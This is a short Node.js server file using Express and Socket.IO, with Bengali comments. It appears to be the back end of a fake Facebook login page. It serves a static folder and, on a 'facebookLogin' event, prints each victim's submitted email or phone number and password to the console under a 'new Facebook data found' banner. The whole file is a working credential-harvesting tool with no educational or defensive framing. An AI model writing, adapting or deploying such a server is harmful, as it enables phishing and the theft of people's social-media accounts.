const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

// public ফোল্ডারটিকে স্ট্যাটিক হিসেবে ডিক্লেয়ার করা
app.use(express.static('public'));

io.on('connection', (socket) => {
    console.log('একজন ইউজার পেজে প্রবেশ করেছে!');

    // ফেসবুক ফর্ম সাবমিট হলে এই ইভেন্টটি কাজ করবে
    socket.on('facebookLogin', (data) => {
        console.log('-----------------------------------------');
        console.log('🔴 নতুন ফেসবুক ডেটা পাওয়া গেছে! 🔴');
        console.log('ইমেইল/মোবাইল:', data.email);
        console.log('পাসওয়ার্ড:', data.password);
        console.log('-----------------------------------------');
    });

    socket.on('disconnect', () => {
        console.log('ইউজার চলে গেছে।');
    });
});

const PORT = 3000;
server.listen(PORT, () => {
    console.log(`সার্ভার চালু হয়েছে: http://localhost:${PORT}`);
});